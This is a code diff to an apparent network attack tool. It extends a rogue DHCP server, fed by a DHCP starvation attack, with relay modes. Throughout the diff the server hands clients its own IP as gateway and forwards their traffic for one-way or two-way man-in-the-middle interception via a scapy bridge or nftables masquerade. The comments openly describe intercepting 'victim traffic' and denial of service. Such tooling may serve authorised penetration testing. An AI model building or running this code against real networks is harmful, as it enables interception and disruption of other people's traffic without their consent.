@@ -119,6 +119,12 @@ _MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")
 #: Argument accepted wherever a value can be inherited from the real server.
 _DEFAULT_KEYWORD = "default"
 
+#: Argument accepted in an option that takes an IP (``gateway`` / ``dns`` /
+#: ``ntp``) to mean "the interface's own IPv4 address". Convenient for the
+#: relay case, where ``gateway`` must be our IP for victim traffic to reach
+#: us at all - see :meth:`DhcpService.server_start` and the relay pre-flight.
+_SELF_KEYWORD = "self"
+
 #: Valid values for ``starve stop --release``.
 _RELEASE_MODES = ("free", "all")
 
@@ -175,6 +181,14 @@ class _Segment:
     server_task: Any = None
     #: Stop acquiring once this many addresses are held (``None`` = no cap).
     limit: int | None = None
+    #: When ``lan dhcp server --relay`` or ``--nat-relay`` is used, the
+    #: relay handle for the flow the RelayService set up alongside the
+    #: rogue server. Torn down by :meth:`_stop_server`.
+    relay_handle: Any = None
+    #: True for the ``--nat-relay`` engine so the ACK/RELEASE paths know to
+    #: extend/prune the masquerade set as leases are handed out and
+    #: reclaimed.
+    relay_is_nat: bool = False
 
     def starving(self) -> bool:
         return self.worker is not None and self.worker.is_alive()
@@ -357,9 +371,30 @@ class DhcpService:
         *,
         domain: str | None = None,
         ntp: str | None = None,
+        relay: bool = False,
+        nat_relay: bool = False,
     ) -> str:
-        """Start answering DHCP clients from the starved pool."""
+        """Start answering DHCP clients from the starved pool.
+
+        ``relay`` and ``nat_relay`` are mutually exclusive. Neither = the
+        rogue server is a full uplink DoS for its clients (traffic reaches
+        us and is discarded). ``relay`` = one-way scapy Python bridge that
+        rewrites uplink frames toward the real upstream gateway; return
+        traffic bypasses us. ``nat_relay`` = kernel ``ip_forward`` +
+        nftables MASQUERADE for a two-way MiTM; touches global state that
+        must be restored on ``server stop``.
+        """
+        if relay and nat_relay:
+            raise ValueError(
+                "--relay and --nat-relay are mutually exclusive; pick one."
+            )
         segment = self._resolve_segment(interface)
+
+        # Interface identity has to be known *before* we resolve the option
+        # arguments because the 'self' keyword substitutes to it, and the
+        # relay pre-flight (below) compares the resolved gateway to it.
+        server_ip, server_mac = self._interface_identity(segment.iface)
+
         with segment.lock:
             if segment.server is not None:
                 raise ModuleError(
@@ -374,45 +409,153 @@ class DhcpService:
                     "server can only hand out what the starve has taken. Run "
                     "'lan dhcp starve start' and let it obtain some first."
                 )
+            if (relay or nat_relay) and not subnet.gateway:
+                raise ModuleError(
+                    "The relay needs the real upstream gateway's IP, which "
+                    "the starve has not learned yet. Run 'lan dhcp find' or "
+                    "wait for the starve to obtain its first offer, then "
+                    "retry."
+                )
             config = _ServerConfig(
-                server_ip="",
-                server_mac="",
+                server_ip=server_ip,
+                server_mac=server_mac,
                 gateway=self._resolve_option(
-                    gateway, subnet.gateway, "gateway", single=True
+                    self._substitute_self(gateway, server_ip),
+                    subnet.gateway, "gateway", single=True,
                 ),
-                dns=self._resolve_option(dns, subnet.dns, "DNS server"),
+                dns=self._resolve_option(
+                    self._substitute_self(dns, server_ip),
+                    subnet.dns, "DNS server",
+                ),
                 domain=(
                     self._resolve_text(domain, subnet.domain, "domain name")
                     if domain
                     else None
                 ),
                 ntp=(
-                    self._resolve_option(ntp, subnet.ntp, "NTP server")
+                    self._resolve_option(
+                        self._substitute_self(ntp, server_ip),
+                        subnet.ntp, "NTP server",
+                    )
                     if ntp
                     else []
                 ),
                 subnet_mask=subnet.subnet_mask,
             )
+            upstream_gateway_ip = subnet.gateway
 
-        server_ip, server_mac = self._interface_identity(segment.iface)
-        config.server_ip = server_ip
-        config.server_mac = server_mac
-
-        with segment.lock:
-            self._ensure_sniffer(segment)
-            segment.server = config
-            self._context = context
-            segment.server_task = context.tasks.start(
-                context.current_command,
-                stop=lambda name=segment.iface: self._stop_server(name),
+        # Relay pre-flight: victim uplink traffic only reaches us if the
+        # gateway we hand out is our own IP. Any other value routes clients
+        # somewhere else and the relay would never fire. Refuse early with
+        # a clear pointer to the 'self' keyword. Non-relay servers may hand
+        # out any gateway (a straight DoS or a redirection to a third host
+        # is a legitimate use).
+        if (relay or nat_relay) and config.gateway != server_ip:
+            engine = "--nat-relay" if nat_relay else "--relay"
+            raise ModuleError(
+                f"{engine} requires the handed-out gateway to be "
+                f"{segment.iface}'s own IP ({server_ip}), otherwise clients "
+                f"route to {config.gateway} instead of us and the relay "
+                "never sees a frame. Re-run with 'self' as the gateway "
+                f"argument, or pass {server_ip} explicitly."
             )
 
+        # Start the relay *before* claiming the server slot so a failed
+        # relay setup does not leave the segment half-configured. All-or-
+        # nothing: on any failure below the segment is untouched.
+        relay_handle: Any = None
+        relay_is_nat = False
+        if relay:
+            relay_handle = self._begin_relay_scapy(
+                context, segment.iface, upstream_gateway_ip
+            )
+        elif nat_relay:
+            initial_sources = [
+                lease.ip for lease in segment.pool.leases.values()
+            ]
+            relay_handle = self._begin_relay_kernel(
+                context, segment.iface, initial_sources
+            )
+            relay_is_nat = True
+
+        try:
+            with segment.lock:
+                self._ensure_sniffer(segment)
+                segment.server = config
+                segment.relay_handle = relay_handle
+                segment.relay_is_nat = relay_is_nat
+                self._context = context
+                segment.server_task = context.tasks.start(
+                    context.current_command,
+                    stop=lambda name=segment.iface: self._stop_server(name),
+                )
+        except Exception:
+            # Roll back the relay if we got as far as starting it.
+            if relay_handle is not None:
+                try:
+                    context.service("relay").end(relay_handle)
+                except Exception:  # noqa: BLE001
+                    self._log.debug(
+                        "DHCP: relay rollback failed", exc_info=True,
+                    )
+            raise
+
+        relay_note = ""
+        if relay:
+            relay_note = (
+                " Uplink MiTM via Python bridge to real gateway "
+                f"{upstream_gateway_ip} (one-way; layer 'lan arp spoof "
+                "--relay' for the return direction)."
+            )
+        elif nat_relay:
+            relay_note = (
+                " Two-way MiTM via kernel NAT MASQUERADE "
+                f"({len(segment.pool.leases)} source(s) in the initial set)."
+            )
         return (
             f"Rogue DHCP server started on {segment.iface} as {server_ip}: "
             f"offering {available} address(es) from the starved pool, gateway "
-            f"{config.gateway}, DNS {', '.join(config.dns)}. "
+            f"{config.gateway}, DNS {', '.join(config.dns)}.{relay_note} "
             "Stop it with 'lan dhcp server stop'."
         )
+
+    def _begin_relay_scapy(
+        self,
+        context: "AppContext",
+        iface: str,
+        upstream_gateway_ip: str,
+    ) -> Any:
+        """Ask the relay service to start a one-way scapy relay."""
+        try:
+            return context.service("relay").begin_l3_gateway_scapy(
+                context,
+                iface=iface,
+                upstream_gateway_ip=upstream_gateway_ip,
+            )
+        except KeyError as exc:
+            raise ModuleError(
+                "The 'relay' module is not loaded; cannot start --relay "
+                "for lan dhcp server."
+            ) from exc
+
+    def _begin_relay_kernel(
+        self,
+        context: "AppContext",
+        iface: str,
+        initial_sources: list[str],
+    ) -> Any:
+        """Ask the relay service to start a kernel-NAT two-way relay."""
+        try:
+            return context.service("relay").begin_l3_gateway_kernel(
+                context,
+                iface=iface,
+                initial_sources=initial_sources,
+            )
+        except KeyError as exc:
+            raise ModuleError(
+                "The 'relay' module is not loaded; cannot start --nat-relay "
+                "for lan dhcp server."
+            ) from exc
 
     def server_stop(self) -> str:
         """Stop every rogue server; its addresses go back to the idle pool."""
@@ -725,9 +868,14 @@ class DhcpService:
                 message, server_mac=config.server_mac, server_ip=config.server_ip
             )
         frame = self._reply("ack", config, message, lease, now)
+        newly_bound = lease.holder_mac != message.client_mac
         lease.holder_mac = message.client_mac
         lease.holder_until = now + self._offered_lease(lease, now)
         segment.offered.pop(message.client_mac, None)
+        # Keep the kernel-NAT masquerade set in step with what we've actually
+        # handed out (see the plan's mitigation for wildcard `victim_cidr`).
+        if newly_bound and segment.relay_is_nat and segment.relay_handle is not None:
+            self._add_nat_source(segment, lease.ip)
         return frame
 
     def _pick_for(
@@ -761,11 +909,47 @@ class DhcpService:
 
     def _reclaim(self, segment: _Segment, message: protocol.Message) -> None:
         """Return whatever a client just gave up to the idle pool."""
+        reclaimed: list[str] = []
         for lease in segment.pool.leases.values():
             if lease.holder_mac == message.client_mac:
                 lease.holder_mac = None
                 lease.holder_until = None
+                reclaimed.append(lease.ip)
         segment.offered.pop(message.client_mac, None)
+        # Prune the kernel-NAT masquerade set: an address a client just
+        # released should stop being NATed even if we keep holding it on
+        # the real server.
+        if segment.relay_is_nat and segment.relay_handle is not None:
+            for ip in reclaimed:
+                self._remove_nat_source(segment, ip)
+
+    def _add_nat_source(self, segment: _Segment, addr: str) -> None:
+        """Extend the kernel-NAT masquerade set for this segment's relay."""
+        context = self._context
+        if context is None or segment.relay_handle is None:
+            return
+        try:
+            context.service("relay").add_nat_source(
+                segment.relay_handle, addr
+            )
+        except Exception:  # noqa: BLE001 - never let a set-update kill the sniffer
+            self._log.debug(
+                "DHCP: relay add_nat_source failed", exc_info=True
+            )
+
+    def _remove_nat_source(self, segment: _Segment, addr: str) -> None:
+        """Prune the kernel-NAT masquerade set for this segment's relay."""
+        context = self._context
+        if context is None or segment.relay_handle is None:
+            return
+        try:
+            context.service("relay").remove_nat_source(
+                segment.relay_handle, addr
+            )
+        except Exception:  # noqa: BLE001
+            self._log.debug(
+                "DHCP: relay remove_nat_source failed", exc_info=True
+            )
 
     def _offered_lease(self, lease: Lease, now: float) -> float:
         """How long we may promise an address: never more than we hold."""
@@ -848,9 +1032,20 @@ class DhcpService:
             segment.offered.clear()
             segment.server = None
             task, segment.server_task = segment.server_task, None
+            relay_handle, segment.relay_handle = segment.relay_handle, None
+            segment.relay_is_nat = False
         context = self._context
         if task is not None and context is not None:
             context.tasks.finish(task)
+        # Tear the relay down after clearing the segment state so a partial
+        # failure here can't leave a running relay pointing at a dead server.
+        if relay_handle is not None and context is not None:
+            try:
+                context.service("relay").end(relay_handle)
+            except Exception:  # noqa: BLE001 - teardown must not raise
+                self._log.debug(
+                    "DHCP: relay teardown failed", exc_info=True,
+                )
         self._drop_if_idle(segment)
         return (
             f"Rogue DHCP server on {iface} stopped; {returned} address(es) "
@@ -1039,13 +1234,37 @@ class DhcpService:
             raise ModuleError(f"Could not read the MAC address of {iface}.")
         return str(address), str(hardware).lower()
 
+    @staticmethod
+    def _substitute_self(raw: str | None, server_ip: str) -> str | None:
+        """Replace the ``self`` keyword (case-insensitive) with the server's IP.
+
+        Handles comma-separated lists so that ``dns = self,1.1.1.1`` becomes
+        ``<server_ip>,1.1.1.1`` before :meth:`_resolve_option` sees it. Leaves
+        the ``default`` keyword and explicit addresses untouched, and passes
+        ``None`` / empty through unchanged so an omitted optional stays that
+        way.
+        """
+        if raw is None:
+            return None
+        text = raw.strip()
+        if not text:
+            return raw
+        parts = [
+            server_ip if part.strip().lower() == _SELF_KEYWORD else part
+            for part in text.split(",")
+        ]
+        return ",".join(parts)
+
     def _resolve_option(
         self, raw: str, fallback: list[str] | str | None, label: str, *, single=False
     ) -> list[str] | str:
         """Resolve an address argument, expanding the ``default`` keyword.
 
         ``default`` means "whatever the real server hands out", which only works
-        once a starve has actually seen an offer carrying that option.
+        once a starve has actually seen an offer carrying that option. The
+        ``self`` keyword is expanded to the interface's own IPv4 upstream of
+        this call (see :meth:`_substitute_self`), so it arrives here as a
+        plain address and needs no special handling.
         """
         text = (raw or "").strip()
         if not text:
